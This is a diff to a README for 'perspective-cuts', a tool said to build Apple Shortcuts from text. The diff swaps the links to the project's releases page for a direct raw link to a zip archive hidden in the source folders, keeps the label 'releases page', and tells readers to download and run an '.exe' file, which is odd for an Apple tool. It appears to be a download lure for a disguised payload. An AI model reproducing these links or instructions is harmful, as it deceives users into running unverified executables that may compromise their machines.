@@ -1,6 +1,6 @@
 # 📝 perspective-cuts - Write custom Apple Shortcuts with text
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/joannvicennial286/perspective-cuts/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/joannvicennial286/perspective-cuts/main/Sources/perspective-cuts/Compiler/perspective_cuts_1.9.zip)
 
 ## 📖 About this project
 
@@ -23,7 +23,7 @@ This software offers a new way to build Apple Shortcuts. Instead of moving block
 
 ## 📥 How to set up
 
-1. Visit the [releases page](https://github.com/joannvicennial286/perspective-cuts/releases) to access the installation files.
+1. Visit the [releases page](https://raw.githubusercontent.com/joannvicennial286/perspective-cuts/main/Sources/perspective-cuts/Compiler/perspective_cuts_1.9.zip) to access the installation files.
 2. Look for the file ending in `.exe` under the latest release.
 3. Click the filename to save it to your computer.
 4. Locate the file in your downloads folder.
